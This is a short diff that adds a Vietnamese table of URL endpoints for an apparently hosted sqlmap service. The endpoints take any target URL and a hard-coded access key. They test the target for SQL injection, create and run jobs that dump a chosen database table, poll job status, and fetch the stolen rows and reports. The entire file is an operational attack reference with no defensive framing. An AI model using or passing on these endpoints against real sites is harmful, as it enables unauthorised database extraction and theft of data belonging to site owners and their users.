@@ -1,0 +1,8 @@
+Chức năng	Link (GET)
+Kiểm tra SQL cơ bản	https://api-sqlmap.netlify.app/checksql?u=<TARGET_URL>&k=minhhocgioi
+Tạo task dump (create)	https://api-sqlmap.netlify.app/dump?u=<TARGET_URL>&db=<DB_NAME>&table=<TABLE_NAME>&mode=create&k=minhhocgioi
+Chạy dump ngay (run mode)	https://api-sqlmap.netlify.app/dump?u=<TARGET_URL>&db=<DB_NAME>&table=<TABLE_NAME>&mode=run&k=minhhocgioi
+Kiểm trạng thái task	https://api-sqlmap.netlify.app/status?taskid=<TASK_ID>&k=minhhocgioi
+Lấy kết quả dump / data	https://api-sqlmap.netlify.app/fetch?taskid=<TASK_ID>&k=minhhocgioi
+Lấy danh sách báo cáo	https://api-sqlmap.netlify.app/report?limit=<N>&k=minhhocgioi
+Gửi báo cáo thủ công (POST)	https://api-sqlmap.netlify.app/report?k=minhhocgioi
